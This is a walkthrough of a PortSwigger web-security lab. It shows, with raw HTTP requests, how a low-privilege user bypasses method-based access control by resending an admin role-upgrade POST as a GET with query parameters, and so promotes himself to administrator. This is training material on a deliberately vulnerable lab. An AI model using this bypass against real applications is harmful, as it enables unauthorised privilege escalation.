# [Lab 6: Method-based access control can be circumvented](https://portswigger.net/web-security/access-control/lab-method-based-access-control-can-be-circumvented)

---

## Description

This lab implements [access controls](https://portswigger.net/web-security/access-control) based partly on the HTTP method of requests. You can familiarize yourself with the admin panel by logging in using the credentials `administrator:admin`.

To solve the lab, log in using the credentials `wiener:peter` and exploit the flawed access controls to promote yourself to become an administrator.

---

## Solution

Login with the credentials `administrator:admin`. Note the functionality that allows an administrator to ugprade or downgrade one of the other user accounts.

![](images/Pasted%20image%2020210922214548.png)

Upgrade request:

```http
POST /admin-roles HTTP/1.1
Host: ac341fcf1e36a805807e16a100dc0040.web-security-academy.net
Cookie: session=TzTKnrT6FEhrgPgAm9U2JYWxUjH6eWcz
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Origin: https://ac341fcf1e36a805807e16a100dc0040.web-security-academy.net
Dnt: 1
Referer: https://ac341fcf1e36a805807e16a100dc0040.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=carlos&action=upgrade
```

Downgrade request:

```http
POST /admin-roles HTTP/1.1
Host: ac341fcf1e36a805807e16a100dc0040.web-security-academy.net
Cookie: session=TzTKnrT6FEhrgPgAm9U2JYWxUjH6eWcz
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: https://ac341fcf1e36a805807e16a100dc0040.web-security-academy.net
Dnt: 1
Referer: https://ac341fcf1e36a805807e16a100dc0040.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close

username=carlos&action=downgrade
```

Log out as `administrator` and log in with the credentials `wiener:peter`.

Attempt to replay the above request with `wiener`'s `session` cookie and note the response.

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json; charset=utf-8
Connection: close
Content-Length: 14

"Unauthorized"
```

Attempt the same request but with different HTTP methods. Changing the HTTP method to `GET` and moving the body parameters into the URL as query parameters results in a 302 redirect to `/admin`.

```http
GET /admin-roles?username=carlos&action=upgrade HTTP/1.1
Host: ac341fcf1e36a805807e16a100dc0040.web-security-academy.net
Cookie: session=wy6Ingnm31TeaGIkdRCrFCbYFqaNmAvM
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: https://ac341fcf1e36a805807e16a100dc0040.web-security-academy.net
Dnt: 1
Referer: https://ac341fcf1e36a805807e16a100dc0040.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```

This seems to indicate that the request was successful. It seems that the application enforces authorization on the `POST:/admin-roles` endpoint, but not on the `GET:/admin-roles` endpoint. This doesn't seem terribly realistic, but does at least show that there is some value in attempting different HTTP methods on the same endpoints.

Set `username` to `wiener`and resend the request to complete the challenge.

```http
GET /admin-roles?username=wiener&action=upgrade HTTP/1.1
Host: ac341fcf1e36a805807e16a100dc0040.web-security-academy.net
Cookie: session=wy6Ingnm31TeaGIkdRCrFCbYFqaNmAvM
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Origin: https://ac341fcf1e36a805807e16a100dc0040.web-security-academy.net
Dnt: 1
Referer: https://ac341fcf1e36a805807e16a100dc0040.web-security-academy.net/admin
Upgrade-Insecure-Requests: 1
Sec-Gpc: 1
Te: trailers
Connection: close
```
